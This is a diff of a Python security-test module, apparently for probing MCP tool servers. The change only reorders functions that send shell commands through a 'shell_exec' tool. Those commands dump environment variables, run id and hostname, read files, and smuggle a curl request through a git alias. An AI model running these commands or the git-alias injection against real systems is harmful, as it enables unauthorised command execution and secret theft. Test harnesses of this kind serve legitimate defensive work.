@@ -67,6 +67,27 @@ KEPT_PLACES = (
 AIM = re.compile(r"/bin/bash|/usr/bin/git")
 
 
+def _exploit(place_id: str):
+    async def run(places: Places, client: MCPClientPort) -> None:
+        await client.call_tool("shell_exec", {"command": _command_for(places[place_id])})
+
+    return run
+
+
+def _command_for(place: Place) -> str:
+    if place.kind is PlaceKind.FILE:
+        return _file_command(place)
+    if place.kind is PlaceKind.ENV:
+        return "/bin/bash -c env"
+    if place.kind is PlaceKind.HOSTNAME:
+        return "/bin/bash -c hostname"
+    if place.kind is PlaceKind.ACCOUNT:
+        return "/bin/bash -c id"
+    if place.kind is PlaceKind.HTTP_ENDPOINT:
+        return _http_command(place)
+    raise ValueError(f"{place.id}: unsupported kind for the command_execution reach")
+
+
 def _file_command(place: Place) -> str:
     coords = place.coordinates
     raw = coords.paths[0] if coords.paths is not None else coords.path
@@ -84,27 +105,6 @@ def _http_command(place: Place) -> str:
     path = place.coordinates.path
     assert host is not None and path is not None
     return f"/usr/bin/git -c alias.x=!curl x -s http://{host}{path}"
-
-
-def _command_for(place: Place) -> str:
-    if place.kind is PlaceKind.FILE:
-        return _file_command(place)
-    if place.kind is PlaceKind.ENV:
-        return "/bin/bash -c env"
-    if place.kind is PlaceKind.HOSTNAME:
-        return "/bin/bash -c hostname"
-    if place.kind is PlaceKind.ACCOUNT:
-        return "/bin/bash -c id"
-    if place.kind is PlaceKind.HTTP_ENDPOINT:
-        return _http_command(place)
-    raise ValueError(f"{place.id}: unsupported kind for the command_execution reach")
-
-
-def _exploit(place_id: str):
-    async def run(places: Places, client: MCPClientPort) -> None:
-        await client.call_tool("shell_exec", {"command": _command_for(places[place_id])})
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
